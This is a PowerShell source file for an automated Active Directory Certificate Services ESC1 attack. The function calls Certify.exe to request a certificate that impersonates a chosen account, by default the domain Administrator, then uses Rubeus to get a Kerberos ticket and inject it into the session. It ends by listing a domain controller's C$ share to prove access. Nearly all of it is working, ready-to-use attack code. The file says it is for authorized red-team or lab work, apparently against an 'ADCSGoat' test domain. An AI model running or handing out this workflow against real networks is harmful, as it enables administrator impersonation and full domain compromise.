function Invoke-ESC1Attack {
    <#
        .SYNOPSIS
        Performs an ESC1 attack by requesting a certificate with specified principal SAN using Certify.exe.

        .DESCRIPTION
        This function executes an ESC1 (SAN Spoofing) attack against a vulnerable certificate template.
        It uses Certify.exe to request a certificate from the specified template while spoofing the 
        Subject Alternative Name (SAN) to impersonate any specified security principal. After successful
        certificate issuance, it automatically uses Rubeus.exe to request a TGT with the certificate
        and applies it to the current session, completing the full attack workflow.
        
        If no target principal is specified, it defaults to the local Administrator account (RID 500).
        
        ESC1 attacks exploit templates that:
        1. Allow SAN specification (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT flag set)
        2. Have Client Authentication EKU enabled
        3. Allow low-privileged users to enroll
        4. Do not require manager approval or authorized signatures

        .PARAMETER TemplateObject
        A DirectoryEntry object representing a certificate template (pKICertificateTemplate) that
        is vulnerable to ESC1 attacks. The template should allow SAN specification and have appropriate
        EKUs configured.

        .PARAMETER CertificateAuthority
        The Certificate Authority to request the certificate from. If not specified, attempts to
        auto-discover available CAs. Format: "CA-SERVER\CA-NAME"

        .PARAMETER CertifyPath
        Path to Certify.exe executable. If not specified, assumes Certify.exe is in the Binaries
        folder (.\Binaries\Certify.exe).

        .PARAMETER RubeusPath
        Path to Rubeus.exe executable. If not specified, assumes Rubeus.exe is in the Binaries
        folder (.\Binaries\Rubeus.exe). Used for automatic TGT request after certificate issuance.

        .PARAMETER OutputPath
        Directory for temporary operations. Defaults to current directory. Note: Certificates
        are kept in memory and not saved to files.

        .PARAMETER TargetPrincipal
        DirectoryEntry object representing the security principal to impersonate in the certificate.
        If not specified, automatically discovers and uses the domain Administrator account (RID 500).
        Can also accept principals resolved using Resolve-Principal function.

        .PARAMETER WhatIf
        Shows what attack would be performed without actually executing Certify.exe.

        .INPUTS
        System.DirectoryServices.DirectoryEntry
        Certificate template DirectoryEntry objects vulnerable to ESC1.

        .OUTPUTS
        PSCustomObject
        Returns attack result with base64 certificate data, target details, and execution status.

        .EXAMPLE
        # Attack a vulnerable template
        $VulnTemplate = Get-AdcsObjects | Where-Object { $_.Properties['name'].Value -eq 'VulnTemplate' }
        Invoke-ESC1Attack -TemplateObject $VulnTemplate

        .EXAMPLE
        # Attack with specific target principal
        $TargetUser = Resolve-Principal -Identity "Administrator"
        $Template = Get-AdcsObjects | Where-Object { $_.Properties['name'].Value -eq 'User' }
        Invoke-ESC1Attack -TemplateObject $Template -TargetPrincipal $TargetUser

        .EXAMPLE
        # Use with pipeline from ConvertTo-ESC1
        $ESC4Issue | ConvertTo-ESC1 -PassThru | Invoke-ESC1Attack

        .EXAMPLE
        # Attack with different target user
        $TargetUser = Resolve-Principal -Identity "DOMAIN\user1"
        Invoke-ESC1Attack -TemplateObject $Template -TargetPrincipal $TargetUser

        .NOTES
        WARNING: This function performs actual certificate attacks that can compromise security.
        Only use in authorized penetration testing or red team exercises.
        
        Requires:
        - Certify.exe (https://github.com/GhostPack/Certify/releases) placed in .\Binaries\ folder
        - Rubeus.exe (https://github.com/GhostPack/Rubeus/releases) placed in .\Binaries\ folder
        - Network access to Certificate Authority
        - Appropriate permissions to enroll certificates
        
        Download Certify.exe and Rubeus.exe and place them in the Binaries folder before using this function.

        .LINK
        https://posts.specterops.io/certified-pre-owned-d95910965cd2
    #>
    [CmdletBinding(SupportsShouldProcess)]
    param (
        [Parameter(Mandatory, ValueFromPipeline)]
        [ValidateNotNull()]
        [System.DirectoryServices.DirectoryEntry]$TemplateObject,
        
        [Parameter()]
        [string]$CertificateAuthority,
        
        [Parameter()]
        [string]$CertifyPath = ".\Binaries\Certify.exe",
        
        [Parameter()]
        [string]$RubeusPath = ".\Binaries\Rubeus.exe",
        
        [Parameter()]
        [string]$OutputPath = ".",
        
        [Parameter()]
        [System.DirectoryServices.DirectoryEntry]$TargetPrincipal
    )

    #requires -Version 7.4

    begin {
        Write-Verbose "[$(Get-Date -Format 'yyyy-MM-dd hh:mm:ss')] Starting $($MyInvocation.MyCommand) on $env:COMPUTERNAME..."
        
        # Validate Certify.exe exists - check multiple possible locations
        if (-not (Test-Path -Path $CertifyPath)) {
            Write-Warning "Certify.exe not found at specified path: $CertifyPath"
            
            # Try common alternative locations
            $alternativePaths = @(
                ".\Binaries\Certify.exe",
                ".\Tools\Certify.exe", 
                ".\Certify.exe",
                "C:\Tools\Certify.exe"
            )
            
            $foundPath = $null
            foreach ($altPath in $alternativePaths) {
                if (Test-Path -Path $altPath) {
                    $foundPath = $altPath
                    break
                }
            }
            
            if ($foundPath) {
                $CertifyPath = $foundPath
                Write-Verbose "Found Certify.exe at alternative location: $CertifyPath"
            } else {
                throw "Certify.exe not found in any expected location. Please download Certify.exe from https://github.com/GhostPack/Certify/releases and place it in the Binaries folder."
            }
        }
        
        # Validate Rubeus.exe exists - check multiple possible locations
        if (-not (Test-Path -Path $RubeusPath)) {
            Write-Warning "Rubeus.exe not found at specified path: $RubeusPath"
            
            # Try common alternative locations
            $rubeusAlternativePaths = @(
                ".\Binaries\Rubeus.exe",
                ".\Tools\Rubeus.exe", 
                ".\Rubeus.exe",
                "C:\Tools\Rubeus.exe"
            )
            
            $foundRubeusPath = $null
            foreach ($altPath in $rubeusAlternativePaths) {
                if (Test-Path -Path $altPath) {
                    $foundRubeusPath = $altPath
                    break
                }
            }
            
            if ($foundRubeusPath) {
                $RubeusPath = $foundRubeusPath
                Write-Verbose "Found Rubeus.exe at alternative location: $RubeusPath"
            } else {
                throw "Rubeus.exe not found in any expected location. Please download Rubeus.exe from https://github.com/GhostPack/Rubeus/releases and place it in the Binaries folder."
            }
        }
        
        # Validate output directory exists or create it
        if (-not (Test-Path -Path $OutputPath)) {
            try {
                New-Item -Path $OutputPath -ItemType Directory -Force | Out-Null
                Write-Verbose "Created output directory: $OutputPath"
            } catch {
                throw "Failed to create output directory: $OutputPath. Error: $($_.Exception.Message)"
            }
        }
        
        # Get domain information for SID construction
        $domainSid = $null
        $netbiosDomain = $null
        try {
            $domain = Get-WmiObject -Class Win32_ComputerSystem | Select-Object -ExpandProperty Domain
            
            # Get NetBIOS domain name using environment variable
            $netbiosDomain = $env:USERDOMAIN
            
            # Get domain SID using DirectoryEntry
            $rootDSE = New-Object System.DirectoryServices.DirectoryEntry("LDAP://RootDSE")
            $defaultNC = $rootDSE.Properties["defaultNamingContext"].Value
            $domainEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$defaultNC")
            
            # Get domain SID from objectSid attribute
            if ($domainEntry.Properties["objectSid"].Value) {
                $domainSidBytes = $domainEntry.Properties["objectSid"].Value
                $domainSidObject = New-Object System.Security.Principal.SecurityIdentifier($domainSidBytes, 0)
                $domainSid = $domainSidObject.Value
            }
            
            Write-Verbose "Domain: $domain, NetBIOS: $netbiosDomain, Domain SID: $domainSid"
        } catch {
            Write-Warning "Could not retrieve domain information: $($_.Exception.Message)"
        }
    }

    process {
        # Validate input is a certificate template
        if ($TemplateObject.SchemaClassName -ne 'pKICertificateTemplate') {
            Write-Error "Input object is not a certificate template. SchemaClassName: $($TemplateObject.SchemaClassName)"
            return [PSCustomObject]@{
                Success = $false
                TemplateName = $TemplateObject.Properties['name'].Value
                Error = "Invalid input: Not a certificate template"
                Certificate = $null
                CertifyOutput = $null
            }
        }
        
        $templateName = $TemplateObject.Properties['name'].Value
        Write-Verbose "Processing certificate template: $templateName"
        
        # Validate template is ESC1 vulnerable
        $nameFlags = [int]$TemplateObject.Properties['msPKI-Certificate-Name-Flag'].Value
        $enrollmentFlags = [int]$TemplateObject.Properties['msPKI-Enrollment-Flag'].Value
        $ekus = $TemplateObject.Properties['pKIExtendedKeyUsage'].Value
        
        $sanEnabled = ($nameFlags -band 0x1) -eq 0x1  # CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT
        $pendingDisabled = ($enrollmentFlags -band 0x2) -eq 0  # CT_FLAG_PEND_ALL_REQUESTS not set
        $clientAuthEnabled = $ekus -contains "1.3.6.1.5.5.7.3.2"  # Client Authentication EKU
        
        if (-not $sanEnabled) {
            Write-Warning "Template '$templateName' does not allow SAN specification (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT not set)"
        }
        
        if (-not $clientAuthEnabled) {
            Write-Warning "Template '$templateName' does not have Client Authentication EKU enabled"
        }
        
        if (-not $pendingDisabled) {
            Write-Warning "Template '$templateName' requires manager approval (CT_FLAG_PEND_ALL_REQUESTS set)"
            Write-Warning "This will likely cause the certificate request to be denied by policy"
        }
        
        # Check if current user has enrollment permissions
        try {
            $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent()
            $currentUserSid = $currentUser.User.Value
            $templateSecurity = $TemplateObject.ObjectSecurity
            
            # Check for Enroll rights
            $enrollGuid = [System.Guid]::new('0e10c968-78fb-11d2-90d4-00c04f79dc55')
            $hasEnrollRights = $templateSecurity.Access | Where-Object {
                $_.IdentityReference.Value -eq $currentUserSid -and 
                $_.ObjectType -eq $enrollGuid -and 
                $_.AccessControlType -eq 'Allow'
            }
            
            if (-not $hasEnrollRights) {
                Write-Warning "Current user ($($currentUser.Name)) may not have Enroll rights on template '$templateName'"
                Write-Warning "This could cause the certificate request to be denied"
            } else {
                Write-Verbose "Current user has Enroll rights on template '$templateName'"
            }
        } catch {
            Write-Verbose "Could not check enrollment permissions: $($_.Exception.Message)"
        }
        
        # Determine target principal SID
        $targetSID = $null
        $targetName = $null
        $targetUPN = $null
        $targetNTAccount = $null
        
        if ($TargetPrincipal) {
            # Extract SID from DirectoryEntry object
            try {
                if ($TargetPrincipal.Properties['objectSid'].Value) {
                    $sidObj = New-Object System.Security.Principal.SecurityIdentifier($TargetPrincipal.Properties['objectSid'].Value, 0)
                    $targetSID = $sidObj.Value
                    $targetName = $TargetPrincipal.Properties['sAMAccountName'].Value
                    
                    # Extract UPN if available
                    if ($TargetPrincipal.Properties['userPrincipalName'].Value) {
                        $targetUPN = $TargetPrincipal.Properties['userPrincipalName'].Value
                        Write-Verbose "Target principal UPN: $targetUPN"
                    }
                    
                    # Construct NTAccount name (DOMAIN\username)
                    $targetNTAccount = "$netbiosDomain\$targetName"
                    
                    Write-Verbose "Using target principal: $targetName (SID: $targetSID)"
                } else {
                    throw "Target principal does not have a valid SID"
                }
            } catch {
                Write-Error "Failed to extract SID from target principal: $($_.Exception.Message)"
                return [PSCustomObject]@{
                    Success = $false
                    TemplateName = $templateName
                    Error = "Invalid target principal"
                    Certificate = $null
                    CertifyOutput = $null
                }
            }
        } else {
            # Default: Use Administrator account (RID 500)
            try {
                # Construct Administrator SID (Domain SID + RID 500)
                if ($domainSid) {
                    $targetSID = "$domainSid-500"
                    $targetName = "Administrator"
                    $targetNTAccount = "$netbiosDomain\Administrator"
                    Write-Verbose "Using default Administrator account (SID: $targetSID)"
                } else {
                    # Fallback: try to find Administrator account directly
                    $adminUser = Get-WmiObject -Class Win32_UserAccount -Filter "SID LIKE '%-500'"
                    if ($adminUser) {
                        $targetSID = $adminUser.SID
                        $targetName = $adminUser.Name
                        $targetNTAccount = "$($adminUser.Domain)\$($adminUser.Name)"
                        Write-Verbose "Found Administrator account via WMI: $targetName (SID: $targetSID)"
                    } else {
                        throw "Could not determine Administrator SID"
                    }
                }
            } catch {
                Write-Error "Failed to determine target principal: $($_.Exception.Message)"
                return [PSCustomObject]@{
                    Success = $false
                    TemplateName = $templateName
                    Error = "Could not determine target principal"
                    Certificate = $null
                    CertifyOutput = $null
                }
            }
        }
        
        # Auto-discover Certificate Authority if not provided
        if (-not $CertificateAuthority) {
            try {
                Write-Verbose "Auto-discovering Certificate Authority..."
                
                # First try using Get-CAFullName with ADCS objects
                try {
                    $adcsObjects = Get-AdcsObjects
                    $caObjects = $adcsObjects | Where-Object { $_.SchemaClassName -eq 'pKIEnrollmentService' }
                    if ($caObjects) {
                        $caFullName = Get-CAFullName -CAObjects $caObjects
                        if ($caFullName) {
                            if ($caFullName -is [string]) {
                                $CertificateAuthority = $caFullName
                            } else {
                                # Multiple CAs found, use the first one
                                $CertificateAuthority = $caFullName[0]
                                Write-Warning "Multiple CAs found, using first: $CertificateAuthority"
                            }
                            Write-Verbose "Discovered CA via ADCS objects: $CertificateAuthority"
                        }
                    }
                } catch {
                    Write-Verbose "Failed to discover CA via ADCS objects: $($_.Exception.Message)"
                }
                
                # Fallback to Certify.exe enum-cas if ADCS method failed
                if (-not $CertificateAuthority) {
                    $certifyDiscovery = & $CertifyPath enum-cas /quiet 2>&1
                    $caMatch = [regex]::Match($certifyDiscovery, "FullName\s*:\s*(.*?$)")
                    if ($caMatch.Success) {
                        $CertificateAuthority = $caMatch.Groups[1].Value.Trim()
                        Write-Verbose "Discovered CA via Certify.exe: $CertificateAuthority"
                    }
                }
                
                if (-not $CertificateAuthority) {
                    throw "Could not auto-discover Certificate Authority using either method"
                }
                
            } catch {
                Write-Error "Failed to discover Certificate Authority: $($_.Exception.Message)"
                return [PSCustomObject]@{
                    Success = $false
                    TemplateName = $templateName
                    Error = "Could not discover Certificate Authority"
                    Certificate = $null
                    CertifyOutput = $null
                }
            }
        }
        
        # Determine UPN value for Certify command (prefer UPN, fallback to NTAccount)
        $upnValue = if ($targetUPN) { $targetUPN } else { $targetNTAccount }
        Write-Verbose "Using UPN value for certificate request: $upnValue"
        
        # Build Certify.exe command arguments (without --out-file)
        $certifyArgs = @(
            "request"
            "--ca"
            $CertificateAuthority
            "--template"
            $templateName
            "--sid"
            $targetSID
            "--upn"
            $upnValue
        )
        
        Write-Verbose "Certify command: $CertifyPath $($certifyArgs -join ' ')"
        
        # Execute the attack
        if ($PSCmdlet.ShouldProcess("Template: $templateName", "ESC1 Attack - Request certificate with Administrator SAN")) {
            try {
                Write-Warning "Executing ESC1 attack against template '$templateName'"
                Write-Warning "Requesting certificate with target principal SAN: $targetName ($targetSID)"
                
                $certifyOutput = & $CertifyPath $certifyArgs 2>&1
                $exitCode = $LASTEXITCODE
                
                Write-Verbose "Certify.exe exit code: $exitCode"
                Write-Verbose "Certify.exe output: $($certifyOutput -join "`n")"
                
                if ($exitCode -eq 0) {
                    Write-Host "[+] ESC1 attack successful!" -ForegroundColor Green
                    
                    # Extract base64 certificate from Certify output
                    $certificate = $null
                    try {
                        # Look for the longest base64-like line in the output (certificate data)
                        $base64Lines = $certifyOutput | Where-Object { 
                            $_ -match '^[A-Za-z0-9+/]+=*$' -and $_.Length -gt 100 
                        }
                        
                        if ($base64Lines) {
                            # Get the longest base64 line (likely the certificate)
                            $certificate = $base64Lines | Sort-Object { $_.Length } -Descending | Select-Object -First 1
                            Write-Verbose "Extracted certificate (length: $($certificate.Length)): $($certificate.Substring(0, [Math]::Min(50, $certificate.Length)))..."
                            Write-Host "[i] Certificate extracted from Certify output" -ForegroundColor Cyan
                        } else {
                            Write-Warning "Could not find base64 certificate in Certify output"
                        }
                    } catch {
                        Write-Warning "Failed to extract certificate from output: $($_.Exception.Message)"
                        $certificate = $null
                    }
                    
                    # Use Rubeus to request TGT with the certificate
                    $rubeusOutput = $null
                    $rubeusExitCode = $null
                    $kirbiFile = $null
                    if ($certificate) {
                        try {
                            Write-Host "[i] Using Rubeus to request TGT with certificate..." -ForegroundColor Cyan
                            
                            # Build Rubeus command arguments
                            # Use UPN if available, otherwise use DOMAIN\username format
                            $rubeusUserValue = if ($targetUPN) { $targetUPN } else { $targetNTAccount }
                            
                            # Create kirbi filename
                            $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
                            $kirbiFileName = "$($targetName)_$timestamp.kirbi"
                            $kirbiFilePath = Join-Path $OutputPath $kirbiFileName
                            
                            $rubeusArgs = @(
                                "asktgt"
                                "/user:$rubeusUserValue"
                                "/certificate:$certificate"
                                "/outfile:$kirbiFilePath"
                                "/ptt"
                            )
                            
                            Write-Verbose "Rubeus command: $RubeusPath $($rubeusArgs -join ' ')"
                            Write-Verbose "Kirbi file will be saved to: $kirbiFilePath"
                            
                            # Execute Rubeus
                            $rubeusOutput = & $RubeusPath $rubeusArgs 2>&1
                            $rubeusOutput += klist
                            $rubeusOutput += Get-ChildItem \\ADCSGoat-DC\C$
                            $rubeusExitCode = $LASTEXITCODE
                            
                            Write-Verbose "Rubeus.exe exit code: $rubeusExitCode"
                            Write-Verbose "Rubeus.exe output: $rubeusOutput"
                            
                            if ($rubeusExitCode -eq 0) {
                                Write-Host "[+] TGT successfully requested and applied!" -ForegroundColor Green
                                
                                # Verify kirbi file was created
                                if (Test-Path $kirbiFilePath) {
                                    $kirbiFile = $kirbiFilePath
                                    Write-Host "[+] Kirbi file saved to: $kirbiFilePath" -ForegroundColor Green
                                } else {
                                    Write-Warning "Kirbi file was not created at expected location: $kirbiFilePath"
                                }
                                
                                # Write-Host "[!] New user context: $([System.Security.Principal.WindowsIdentity]::GetCurrent().Name)" -ForegroundColor Yellow
                                Write-Host (Get-ChildItem \\ADCSGoat-DC\C$)
                                klist
                                
                            } else {
                                Write-Warning "Rubeus failed with exit code $rubeusExitCode"
                            }
                            
                        } catch {
                            Write-Warning "Failed to execute Rubeus: $($_.Exception.Message)"
                        }
                    } else {
                        Write-Warning "Skipping Rubeus TGT request - no certificate available"
                    }
                    
                    return [PSCustomObject]@{
                        Success = $true
                        TemplateName = $templateName
                        Certificate = $certificate
                        TargetPrincipal = $targetName
                        TargetSID = $targetSID
                        CertificateAuthority = $CertificateAuthority
                        CertifyOutput = $certifyOutput -join "`n"
                        RubeusOutput = if ($rubeusOutput) { $rubeusOutput -join "`n" } else { $null }
                        RubeusExitCode = $rubeusExitCode
                        KirbiFile = $kirbiFile
                        ExitCode = $exitCode
                        Error = $null
                    }
                } else {
                    # Analyze specific error types
                    $outputString = $certifyOutput -join "`n"
                    $errorMessage = "Certify.exe failed with exit code $exitCode"
                    
                    if ($outputString -match "Denied by Policy Module.*0x80094800") {
                        $errorMessage += "`n`nPolicy Module Error (0x80094800) - Possible causes:"
                        $errorMessage += "`n- Template requires manager approval (check msPKI-Enrollment-Flag)"
                        $errorMessage += "`n- User lacks enrollment permissions on the template"
                        $errorMessage += "`n- CA has additional policy restrictions"
                        $errorMessage += "`n- Template may not be properly published to the CA"
                        
                        # Check template flags for additional context
                        if (-not $pendingDisabled) {
                            $errorMessage += "`n- CONFIRMED: Template requires manager approval (msPKI-Enrollment-Flag has CT_FLAG_PEND_ALL_REQUESTS set)"
                        }
                        
                        Write-Warning "Certificate request was denied by CA policy"
                        Write-Host "Troubleshooting suggestions:" -ForegroundColor Yellow
                        Write-Host "1. Check if template requires manager approval" -ForegroundColor Yellow
                        Write-Host "2. Verify current user has Enroll permissions on template" -ForegroundColor Yellow
                        Write-Host "3. Ensure template is published to the CA" -ForegroundColor Yellow
                        Write-Host "4. Check CA policy settings" -ForegroundColor Yellow
                    } elseif ($outputString -match "access.*denied|unauthorized") {
                        $errorMessage += "`n`nAccess Denied - User may not have enrollment permissions on this template"
                    } elseif ($outputString -match "template.*not.*found") {
                        $errorMessage += "`n`nTemplate Not Found - Template may not be published to the CA"
                    }
                    
                    $errorMessage += "`n`nFull Certify output: $outputString"
                    throw $errorMessage
                }
                
            } catch {
                Write-Error "ESC1 attack failed: $($_.Exception.Message)"
                return [PSCustomObject]@{
                    Success = $false
                    TemplateName = $templateName
                    Error = $_.Exception.Message
                    Certificate = $null
                    CertifyOutput = if ($certifyOutput) { $certifyOutput -join "`n" } else { $null }
                    RubeusOutput = if ($rubeusOutput) { $rubeusOutput -join "`n" } else { $null }
                    RubeusExitCode = $rubeusExitCode
                    KirbiFile = if ($kirbiFile) { $kirbiFile } else { $null }
                    ExitCode = if ($exitCode) { $exitCode } else { $null }
                }
            }
        } else {
            # WhatIf mode
            # Generate kirbi filename for WhatIf display
            $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
            $kirbiFileName = "$($targetName)_$timestamp.kirbi"
            $kirbiFilePath = Join-Path $OutputPath $kirbiFileName
            
            Write-Host "What if: Would execute ESC1 attack against template '$templateName'" -ForegroundColor Yellow
            Write-Host "What if: Would request certificate with target principal SAN: $targetName ($targetSID)" -ForegroundColor Yellow
            Write-Host "What if: Would extract certificate from Certify output" -ForegroundColor Yellow
            Write-Host "What if: Certify command: $CertifyPath $($certifyArgs -join ' ')" -ForegroundColor Yellow
            Write-Host "What if: Would use Rubeus to request TGT with certificate" -ForegroundColor Yellow
            Write-Host "What if: Rubeus command: $RubeusPath asktgt /user:$($targetUPN ?? $targetNTAccount) /certificate:<cert> /outfile:$kirbiFilePath /ptt" -ForegroundColor Yellow
            Write-Host "What if: Would save kirbi file to: $kirbiFilePath" -ForegroundColor Yellow
            
            return [PSCustomObject]@{
                Success = $true
                TemplateName = $templateName
                Certificate = $null
                TargetPrincipal = $targetName
                TargetSID = $targetSID
                CertificateAuthority = $CertificateAuthority
                CertifyOutput = "WhatIf mode - attack not executed"
                RubeusOutput = "WhatIf mode - Rubeus not executed"
                RubeusExitCode = 0
                KirbiFile = $null
                ExitCode = 0
                Error = $null
            }
        }

    }

    end {
        Write-Verbose "[$(Get-Date -Format 'yyyy-MM-dd hh:mm:ss')] Finishing $($MyInvocation.MyCommand) on $env:COMPUTERNAME..."
    }
}
